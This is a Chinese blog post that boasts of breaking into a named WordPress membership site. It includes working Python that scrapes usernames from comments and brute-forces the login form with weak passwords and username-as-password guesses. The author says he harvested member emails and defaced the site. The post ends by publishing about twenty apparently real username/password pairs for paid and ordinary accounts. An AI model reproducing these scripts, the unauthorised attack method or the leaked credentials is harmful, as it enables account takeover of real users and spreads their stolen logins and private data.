---
title: 用Python攻陷某WP网站
tags:
  - python

date: 2017-12-11 18:36:28


categories:
 - python 

---
 >今天又来带大家出来搞事情，这篇文章可是稳稳的福利篇啊！Python真是一大利器， 就是生活中我的左右手，隐藏了这么久的时间，可不是什么没干，项目做到一半，烦躁的不行，就想找些其他事情做做。
<!--more-->
正好无意间碰见一个WordPress搭建的[福利网站](sstushu.net/)，里面的资源可真是丰富啊！但是最丰富的资源还是要会员才能够接触到，看了看这个登录的界面，发现可以搞事情。
*ps：文章后面留下了部分的福利，不满足的老司机私聊~你懂得*

>![](http://upload-images.jianshu.io/upload_images/6967995-5363450eeab3f0c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### 执行计划

1.寻找切入点
2.提取用户名
3.获取密码
4.发送邮件
5.删除所以违法信息

### 必备准备

写python代码

### 开工

首先 立据双手离开键盘以示清白，看到这个登录的界面，就知道可以搞事情，没有验证码，没有验证码机制。我就立马注册了一个帐号

注册ing

注册完成之后，登录，浏览网页，浏览网页，还在浏览网页

额……

不对，我是来搞事情的，不是来浏览网页的，发现了其中的资源确实丰富，但要想浏览下面的内容呢！还得要冲个会员才能办。下面的内容就是获取资源与得到会员
###寻找帐号
首先先观测，大概网页的内容就分为三部分：**‘资源’**，**‘注册登录’**， **‘个人信息’**。

要想登录别人的帐号，就得先得到别人的帐号密码，只能说这个网站是个小站，里面的各种安全都没有考虑到。也可能是站长花钱买的。只能说买的冤啊！在热门的帖子下面都有好多用户评论，而评论的用户名就是他们的帐号，这个网站并没有增加用户名，这样得到他们的帐号也就容易的多了。我就写个脚本，爬下网站的所有的信息，找出所有的用户名


````
#获取全站的用户名
import re
import requests
def gethtml(url):                #获取html
    headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
      'Referer': 'http://sstushu.net/%e7%99%bb%e5%bd%95?loggedout=true'
    }
    html = requests.get(url, headers=headers)
    return html.text

for i in range(2,39):
    if i == 1:
        url = 'http:/sstushu.net/'             #第一页的内容
    else:
        url = 'http://sstushu.net/page/' + str(i)
    html = gethtml(url)                     #解析网页
    urls = re.findall('<a href="(.*?)" class="zoom" rel="bookmark"', html)
    for each in urls:  
        for each2 in re.findall('<strong>(.*?)</strong>:', gethtml(each)): #获取用户名
            f = open('yonghu.txt', 'a+', encoding='utf-8')
            f.write(each2)
            f.write('\n')
            f.close()



````

我的天，好家伙哦这个小站跑出了1000多的用户名，出去其中重复的用户名，那也得有600多啊！这个可是一个如此丰富的资源。看看他们注册的用户名，大都是随手输入的帐号，有的类似于qq号，有的是手机号。也有随手的一段字符。折这么多我想着要不要去重一下。

````
# with open('.\\passwd.txt', 'r')as f:
#     for i in f:
#         # print(i)
#         with open('.\\passwd.txt', 'r')as g:
#             a = 0
#             for j in g:
#                 # print(j)
#                 if i == j:
#                     a += 1
#                     if a ==2:
#                         print(i)
````
这样就舒服多了。这么多的帐号，又是随手输入，就用弱口令跑一跑，肯定不会多难。来，在写个post的脚本，把账户和密码模拟浏览器输入进去。登录成功的就保存在一个txt文档中。

### 找到密码

对了，在最开始测试的时候，找取**部分**用户名，我的用户名放在前后保证能看到好的结束，我的密码也加入到爆破的字典中。第一次跑，发现并没有跑出来太多，也就一点点吧。试了试都能上。但是我有这么大的帐号源，就跑出来这几个，就有点亏了吧！难道是我的字典太小了？也不至于啊。50个常用密码对付这米有安全意识的密码，还不算拿不出手啊！

忘了最重要的一点。要是我注册一个网站，不会也输入一个额外的密码，就直接用户名和帐号一起使用了。哦！更新代码……


````
#http://sstushu.net/%e7%99%bb%e5%bd%95
import re
import requests
def baopo(i,j):
    url = 'http://sstushu.net/%e7%99%bb%e5%bd%95'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
        'Referer': 'http://sstushu.net/%e7%99%bb%e5%bd%95?loggedout=true'     #网站打码
    }
    data = {
        'log': i,
        'pwd': j,
        'wp-submit': '登录',
        'redirect_to': '',
        'wpuf_login': 'true',
        'action': 'login',
        '_wpnonce': '4b4e82f670',
        '_wp_http_referer': '/%e7%99%bb%e5%bd%95?loggedout=true'
    }
    a = requests.post(url, headers=headers, data=data)
    # print(a)
    print(a.history)
    if a.history == []:
        pass
    else:
        with open('sucess.txt','a+')as f:
            f.write('log:'+i+'\r'+'passwd:'+j)

with open('yonghu.txt', 'r')as f:
    for i in f:
        baopo(i, i)        #用户名也验证一下
        print(i)
        with open('passwd.txt', 'r')as g:
            for j in g:
                print(j)

                baopo(i, j)
````


看到这满满的用户名密码：心里可满足了。

![](http://upload-images.jianshu.io/upload_images/6967995-68a11595ca427dd4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

这战绩还是不错的。登录一下啊，还有大概40多个是终身会员，还真有忠实的粉丝冲钱。
还看看到一个额外的福利，不知道是不是太忙，冲了钱忘记花了，还是睡的早，记性不好。最关键的还是网站有站内提现的功能，本着不破坏的原则，就不动他的余额了。希望下次他自己用掉吧！

![](http://upload-images.jianshu.io/upload_images/6967995-de8124e7b59b342a.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

到这仍然没有结束，现在我能拿到帐号，密码，会员，还是不太甘心，再发掘发掘有没有其他的内容，也没有什么了，就有一个邮箱还算个人的隐私。这样吧！我也就不好意思了，写个脚本把[你们的邮箱](http://sstushu.net/%e4%b8%aa%e4%ba%ba%e4%b8%ad%e5%bf%83)全都批量的拿下来吧！
![](http://upload-images.jianshu.io/upload_images/6967995-98d28e928d1d8bc7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)



![](http://upload-images.jianshu.io/upload_images/6967995-bec38c31cbcefa09.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

````
import re
````
为了再装最后一波B就在网址上留下http://hack的标记，记得你的密码有点弱，下次就要改下密码了。
### 发送邮件
然后把提取下来的脚本的邮箱们我再发送一封邮件，这种重复性的动作就继续上脚本。

````
import linecache
import time
from email.mime.text import MIMEText
from email.header import Header
from smtplib import SMTP_SSL
lines = linecache.getlines('email.txt')
email_list = []
for i in lines:
    email_list.append(str(i))
for i in range(len(email_list)):
#设置的参数登录帐号 邮箱 密码
smtpserver = '.163.com'    #发邮件邮箱服务
poplibserver = 'pop.163.com'    #查看邮件服务
sender = 'xxxxxxxx@163.com' # 邮件登陆着，发件人
passwd = 'xxxx' # 登录邮件的授权密码
receive = email_list[i] #接受者的邮箱，换成列表就可以多个发送
#设置发送内容的
emailsubject = 'hello，温馨提醒，已经有人修改你的帐号内容，你的绅士图书馆账号密码过于简单已经泄漏，请登录后修改密码。'
emailtitle = 'change your passwd'
#构造一封邮件
message = MIMEText(emailtitle, 'plain', 'utf-8') #plain文本的格式
message['Subject'] = Header(emailsubject, 'utf-8')
message['From'] = sender
message['To'] = receive
# print(message.as_string())
#登录邮箱，给本邮箱发送邮件一封
smtp = SMTP_SSL(smtpserver) #连接到服务器
smtp.login(sender,passwd)   #登录到邮箱
smtp.sendmail(sender, receive, message.as_string())
smtp.quit()


````
### change your passwd
>![image.png](http://upload-images.jianshu.io/upload_images/6967995-7fe375c3072cc951.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)




### 福利
这里扔出来几个运气不好的会员帐号，也来确保我有拿到真的数据，真的可以登录[福利网站](sstushu.net/)。

（同时发现帐号的密码是可以任何一个人不需要验证的情况下修改的，大家不需要修改这几个倒霉的帐号了）

**会员帐号**
````
log:fzyvin
passwd:abc123

log:wssbwssb
passwd:wssbwssb

log:nnk126
passwd:123456789

log:bbs8960334
passwd:bbs8960334 

log:1162512354
passwd:1162512354

log:tianhuan 
passwd:tianhuan
````
**普通帐号**

````
log:adshn
passwd:123456789             
log:592057962
passwd:123456                  
log:1284783709
passwd:1284783709                 
log:123456789012
passwd:123456789                
log:592057962
passwd:123456                   
log:1284783709
passwd:1284783709               
log:1007404289 
passwd:1007404289                 
log:qq5825142
passwd:qq123456                 
log:kira03
passwd:123123               
log:qwe123456
passwd:123456                  
log:elic
passwd:password                  
log:f4867787
passwd:f4867787                    
log:qq2454173015
passwd:qq2454173015             
log:3773537760
passwd:123123123                 
passwd:wzx223366       
passwd:f4867787       
………………
````

![image.png](http://upload-images.jianshu.io/upload_images/6967995-1d853b3ba4dccf78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![](http://upload-images.jianshu.io/upload_images/6967995-321a90adb2f79df7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


我是有多么的闲啊！写了这么多忽然发现，可以吃饭了。我所有要跑的程序大都在阿里云服务器上跑得。毕竟可以省去我电脑的功夫，说实话我感觉好像是跑了大约一两个夜晚吧！才搞完所有的东西，其实买个服务器在上面跑跑脚本，还是挺好的，见见世面嘛！

>**Q：阿里云服务器怎么跑脚本？**
**R：**参见我另一篇文章的[传送门](http://www.jianshu.com/p/afdde6b44534)如何在服务器上快速部署跑python脚本

>**Q:写了这么多，给了资源我能不给你点赞吗？**
**R：**如果你欣赏的通俗易懂的文采，就给个赞再走吧！感谢orz-






